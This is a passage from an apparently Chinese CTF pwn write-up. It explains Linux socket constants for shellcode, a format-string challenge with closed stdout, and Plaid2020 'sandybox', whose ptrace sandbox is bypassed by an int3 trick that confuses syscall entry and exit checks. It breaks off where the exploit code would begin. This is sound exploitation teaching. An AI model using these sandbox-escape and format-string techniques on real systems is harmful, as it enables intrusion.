class="keyword">define</span> AF_CAIF37<span class="comment">/* CAIF sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ALG38<span class="comment">/* Algorithm sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NFC39<span class="comment">/* NFC sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_VSOCK40<span class="comment">/* vSockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_KCM41<span class="comment">/* Kernel Connection Multiplexor*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_QIPCRTR42<span class="comment">/* Qualcomm IPC Router          */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SMC43<span class="comment">/* smc sockets: reserve number for</span></span></span><br><span class="line"><span class="comment"><span class="meta"> * PF_SMC protocol family that</span></span></span><br><span class="line"><span class="comment"><span class="meta"> * reuses AF_INET address family</span></span></span><br><span class="line"><span class="comment"><span class="meta"> */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_XDP44<span class="comment">/* XDP sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MCTP45<span class="comment">/* Management component</span></span></span><br><span class="line"><span class="comment"><span class="meta"> * transport protocol</span></span></span><br><span class="line"><span class="comment"><span class="meta"> */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MAX46<span class="comment">/* For now.. */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Protocol families, same as address families. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_UNSPECAF_UNSPEC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_UNIXAF_UNIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_LOCALAF_LOCAL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_INETAF_INET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_AX25AF_AX25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IPXAF_IPX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_APPLETALKAF_APPLETALK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>PF_NETROMAF_NETROM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_BRIDGEAF_BRIDGE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ATMPVCAF_ATMPVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_X25AF_X25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_INET6AF_INET6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ROSEAF_ROSE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_DECnetAF_DECnet</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NETBEUIAF_NETBEUI</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SECURITYAF_SECURITY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_KEYAF_KEY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NETLINKAF_NETLINK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ROUTEAF_ROUTE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PACKETAF_PACKET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ASHAF_ASH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ECONETAF_ECONET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ATMSVCAF_ATMSVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_RDSAF_RDS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SNAAF_SNA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IRDAAF_IRDA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PPPOXAF_PPPOX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_WANPIPEAF_WANPIPE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_LLCAF_LLC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IBAF_IB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MPLSAF_MPLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_CANAF_CAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_TIPCAF_TIPC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_BLUETOOTHAF_BLUETOOTH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IUCVAF_IUCV</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_RXRPCAF_RXRPC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ISDNAF_ISDN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PHONETAF_PHONET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IEEE802154AF_IEEE802154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_CAIFAF_CAIF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ALGAF_ALG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NFCAF_NFC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_VSOCKAF_VSOCK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_KCMAF_KCM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_QIPCRTRAF_QIPCRTR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SMCAF_SMC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_XDPAF_XDP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MCTPAF_MCTP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MAXAF_MAX</span></span><br></pre></td></tr></table></figure><p>第三个参数和第一个是对应的,当然不是说这两个参数要选择完全一样的</p><p>第二个参数用于指定TCP,UDP等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * enum sock_type - Socket types</span></span><br><span class="line"><span class="comment"> * @SOCK_STREAM: stream (connection) socket</span></span><br><span class="line"><span class="comment"> * @SOCK_DGRAM: datagram (conn.less) socket</span></span><br><span class="line"><span class="comment"> * @SOCK_RAW: raw socket</span></span><br><span class="line"><span class="comment"> * @SOCK_RDM: reliably-delivered message</span></span><br><span class="line"><span class="comment"> * @SOCK_SEQPACKET: sequential packet socket</span></span><br><span class="line"><span class="comment"> * @SOCK_DCCP: Datagram Congestion Control Protocol socket</span></span><br><span class="line"><span class="comment"> * @SOCK_PACKET: linux specific way of getting packets at the dev level.</span></span><br><span class="line"><span class="comment"> *  For writing rarp and other similar things on the user level.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When adding some new socket type please</span></span><br><span class="line"><span class="comment"> * grep ARCH_HAS_SOCKET_TYPE include/asm-* /socket.h, at least MIPS</span></span><br><span class="line"><span class="comment"> * overrides this enum for binary compat reasons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sock_type</span> &#123;</span></span><br><span class="line">SOCK_STREAM= <span class="number">1</span>,</span><br><span class="line">SOCK_DGRAM= <span class="number">2</span>,</span><br><span class="line">SOCK_RAW= <span class="number">3</span>,</span><br><span class="line">SOCK_RDM= <span class="number">4</span>,</span><br><span class="line">SOCK_SEQPACKET= <span class="number">5</span>,</span><br><span class="line">SOCK_DCCP= <span class="number">6</span>,</span><br><span class="line">SOCK_PACKET= <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>像这题使用的是socket(2,1,0)(<u>不知道为什么socket(2,1,2)不行</u>)</p><p>之后是<strong>int __sys_connect(int fd, struct sockaddr __user *uservaddr, int addrlen)</strong></p><p>第一个参数是之前socket的返回<code>fd</code></p><p>第三个一般是<code>0x10</code></p><p>第二个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line"><span class="type">sa_family_t</span>sa_family;<span class="comment">/* address family, AF_xxx*/</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">char</span> sa_data_min[<span class="number">14</span>];<span class="comment">/* Minimum 14 bytes of protocol address*/</span></span><br><span class="line">DECLARE_FLEX_ARRAY(<span class="type">char</span>, sa_data);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里用的是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __SOCK_SIZE__16<span class="comment">/* sizeof(struct sockaddr)*/</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">  <span class="type">__kernel_sa_family_t</span>sin_family;<span class="comment">/* Address family*/</span></span><br><span class="line">  __be16sin_port;<span class="comment">/* Port number*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span><span class="title">sin_addr</span>;</span><span class="comment">/* Internet address*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pad to size of `struct sockaddr&#x27;. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>__pad[__SOCK_SIZE__ - <span class="keyword">sizeof</span>(<span class="type">short</span> <span class="type">int</span>) -</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span>) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> in_addr)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>需要注意协议<code>sin_family</code>是小端</p><p><code>sin_port</code>和<code>sin_addr</code>则是大端(网络字节序)</p><h1 id="2022鹏城杯-one"><a href="#2022鹏城杯-one" class="headerlink" title="2022鹏城杯-one"></a>2022鹏城杯-one</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序就是给出一个栈地址,之后关闭标准输出,并给出一个格式化字符串漏洞</p><p>主要用到printf函数会在栈上留下一些libc符号信息,例如__IO_2_1_stdout</p><p>如果修改printf的返回地址,就有可能使之保留在栈上</p><p>之后再次利用格式化字符串将stdout指向stderr,从而恢复正常的输出</p><h1 id="Plaid2020-sandybox"><a href="#Plaid2020-sandybox" class="headerlink" title="Plaid2020-sandybox"></a>Plaid2020-sandybox</h1><p>这题实现沙盒的方式有点意思,</p><p>以往pwn题实现沙盒一般都是使用seccomp或者prctl相关调用</p><p>但是这题是通过ptrace这个调用实现的</p><p>开头的sub_1330的作用主要是设置一些cpu相关</p><blockquote><p>Program does have some <code>rlimits</code> limitations, restricting the cpu usage, file sizes and numer of processes. Nothing interesting.</p></blockquote><p>之后便是调用fork</p><p><strong>子进程</strong></p><p>子进程中的<code>prctl(1, 9LL)</code> 的作用是设置当前进程的核心转储行为，使之允许生成核心转储文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = __errno_location();</span><br><span class="line">  v5 = strerror(*v4);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;child traceme %s\n&quot;</span>, v5);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code>使得子进程暂停并等待父进程trace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v9 = getpid();</span><br><span class="line">kill(v9, <span class="number">19</span>);</span><br></pre></td></tr></table></figure><p>之后发送<code>SIGSTOP</code>信号(我之前一直以为kill是真kill orz)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_D10</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*v0)(<span class="type">void</span>); <span class="comment">// r12</span></span><br><span class="line">  <span class="type">void</span> (*v1)(<span class="type">void</span>); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  syscall(<span class="number">37LL</span>, <span class="number">20LL</span>);</span><br><span class="line">  v0 = (<span class="type">void</span> (*)(<span class="type">void</span>))mmap(<span class="number">0LL</span>, <span class="number">0xA</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, v1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    v1 = (<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)v1 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != (<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)v0 + <span class="number">10</span>) );</span><br><span class="line">  v0();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是子进程的真正部分了</p><p>读入十个字节并执行,这里要注意当执行到这里时rsi刚好就是v0+10</p><p>所以完全可以读入更多shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 1000</span><br><span class="line">pop rdx</span><br><span class="line">xor eax, eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><strong>父进程</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( waitpid(v3, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> || (_BYTE)stat_loc != <span class="number">127</span> || BYTE1(stat_loc) != <span class="number">19</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = __errno_location();</span><br><span class="line">  v14 = strerror(*v13);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;initial waitpid fail 0x%x %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)stat_loc, v14);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>waitpid</code> 函数的作用是阻塞当前进程，直到指定的子进程中的一个发生变化为止。变化可能是子进程终止、暂停、继续执行或者被恢复执行等。</p><p>stat_loc用于存储信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_SETOPTIONS, v12, <span class="number">0LL</span>, <span class="number">0x100000</span>LL);</span><br></pre></td></tr></table></figure><p>设置跟踪进程的选项，以便跟踪进程的退出状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(PTRACE_SYSCALL, v12, <span class="number">0LL</span>, v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = *__errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = strerror(v21);</span><br><span class="line">      __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;ptrace syscall1 %s\n&quot;</span>, v22);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( waitpid(v12, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)stat_loc != <span class="number">127</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;so long, sucker 0x%x\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = BYTE1(stat_loc);</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  __dprintf_chk(<span class="number">2LL</span>, <span class="number">1LL</span>, <span class="string">&quot;child signal %d\n&quot;</span>, BYTE1(stat_loc));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PTRACE_SYSCALL</code> 标志表示要执行的操作是单步执行系统调用。这意味着被跟踪的进程将在<strong><u>下一个</u></strong>系统调用发生时停止,并等待跟踪父进程接收通知。</p><p>信号5是 SIGTRAP 信号。SIGTRAP信号是一个特殊的信号，用于调试和跟踪进程的执行。用于通知目标进程停止执行，以便调试器可以执行相关操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(PTRACE_GETREGS, v12, <span class="number">0LL</span>, v30) )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = __errno_location();</span><br><span class="line">  v24 = strerror(*v23);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;ptrace getregs %s\n&quot;</span>, v24);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到所有的寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_DA0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="keyword">struct</span> user_regs_struct *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 orig_ax; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 di; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  orig_ax = a2-&gt;orig_ax;</span><br><span class="line">  <span class="keyword">if</span> ( orig_ax != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax &gt; <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( orig_ax == <span class="number">37</span> )</span><br><span class="line">        <span class="keyword">return</span> a2-&gt;di - <span class="number">1</span> &gt; <span class="number">0x13</span>;</span><br><span class="line">      <span class="keyword">if</span> ( orig_ax &lt;= <span class="number">0x25</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( orig_ax &lt;= <span class="number">0xB</span> )</span><br><span class="line">          <span class="keyword">return</span> a2-&gt;si &gt; <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> orig_ax != <span class="number">60</span> &amp;&amp; orig_ax != <span class="number">231</span> &amp;&amp; orig_ax != <span class="number">39</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a2-&gt;si )</span><br><span class="line">      &#123;</span><br><span class="line">        di = a2-&gt;di;</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">0LL</span>;</span><br><span class="line">        v5 = ptrace(PTRACE_PEEKDATA, a1, di, <span class="number">0LL</span>);</span><br><span class="line">        v6 = ptrace(PTRACE_PEEKDATA, a1, a2-&gt;di + <span class="number">8</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">-1</span> &amp;&amp; v6 != <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)&amp;v7 = v5;</span><br><span class="line">          *((_QWORD *)&amp;v7 + <span class="number">1</span>) = v6;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7) &lt;= <span class="number">0xF</span></span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;proc&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;sys&quot;</span>) != <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax &gt;= <span class="number">2</span> &amp;&amp; orig_ax != <span class="number">3</span> &amp;&amp; orig_ax != <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是一个check</p><p><code>PTRACE_PEEKDATA</code> 标志表示进行读取进程信息,第三个参数是目标地址</p><p>这里对不少系统调用做了限制,逆向挺简单的,就不分析了</p><h2 id="int3绕过"><a href="#int3绕过" class="headerlink" title="int3绕过"></a>int3绕过</h2><p>且看man ptrace</p><blockquote><pre><code>   PTRACE_SYSCALL, PTRACE_SINGLESTEP          Restart the stopped tracee as for PTRACE_CONT, but arrange for the tracee to be          stopped  at the next entry to or exit from a system call, or after execution of          a single instruction, respectively.   (The  tracee  will  also,  as  usual,  be          stopped  upon  receipt of a signal.)  From the tracer&#39;s perspective, the tracee          will  appear  to  have  been  stopped  by  receipt  of  a  SIGTRAP.   So,   for          PTRACE_SYSCALL, for example, the idea is to inspect the arguments to the system          call at the first stop, then do another PTRACE_SYSCALL and inspect  the  return          value  of  the system call at the second stop.  The data argument is treated as          for PTRACE_CONT.  (addr is ignored.)</code></pre></blockquote><p>可以看到ptrace(PTRACE_SYSCALL,…)<u><strong>不仅会在进入syscall时停止,而且还会在退出时停止</strong></u></p><p>并且最重要的是其并<u>无法识别此时究竟是进入syscall还是退出syscall</u></p><p>那么如果我们颠倒检查的顺序,那么check的就是退出时候的寄存器,而真正进入syscall时却没有检查</p><p>至于如何做到就要利用<code>int 3</code>这个软中断,<code>int 3</code>我们都知道是用于调试目的的软件中断,当触发 <code>int 3</code> 中断的时候，调试器会捕获到这个中断，误以为此时是进入syscall,然后暂停程序的执行进行检查</p><p>exp</p><figure class="highlight py"><table><tr><td 